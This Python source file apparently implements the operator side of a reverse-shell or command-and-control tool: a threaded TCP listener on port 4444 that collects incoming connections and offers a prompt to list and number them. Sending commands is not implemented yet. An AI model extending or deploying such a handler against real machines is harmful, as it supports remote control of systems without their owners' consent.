import socket, json
import base64
import sys
import threading
from termcolor import colored

def UkDecode(text):
	text = text.decode("cp866")
	for i in range(len(text) - 1):
		if text[i] == "?":
			text = text[:i] + "і" + text[i+1:]
	return text



class Listener:

	def __init__(self, ip, port):
		self.connections = []

		self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.listener.bind((ip, port))

		print("[+] Waiting for incoming connections")



	def listen(self):
		try:
			self.listener.listen(0)
			connection, address = self.listener.accept()
			print("\n[+] Got a connection from " + str(address))
			print("# Press Enter")
			self.connections.append((connection, address))
			self.listen()
		except: pass


	def get_connections(self):
		return self.connections


	def close(self):
		self.listener.close()



if __name__ == "__main__":
	listener = Listener("192.168.0.199", 4444)

	listen_thread = threading.Thread(target=listener.listen)
	listen_thread.start()

	while True:
		command = input(">>> ")
		if command == "exit":
			listener.close()
			break

		if command == "print":
			for con in listener.get_connections():
				print(con[1])

		if command == "choose":
			connections = listener.get_connections()
			for con in range(len(connections)):
				connection = connections[con][1]
				print(f"{str(con+1)}. {connection}")

		if command == "help":
			help_message = colored("\n Type 'help' to see it\n\n", "yellow")
			help_message += colored(" print", "green") + " - show all connections;\n"
			help_message += colored(" choose", "green") + " - choose connection;\n"
			help_message += colored(" exit", "red") + " - stop the program; \n"
			print(help_message)



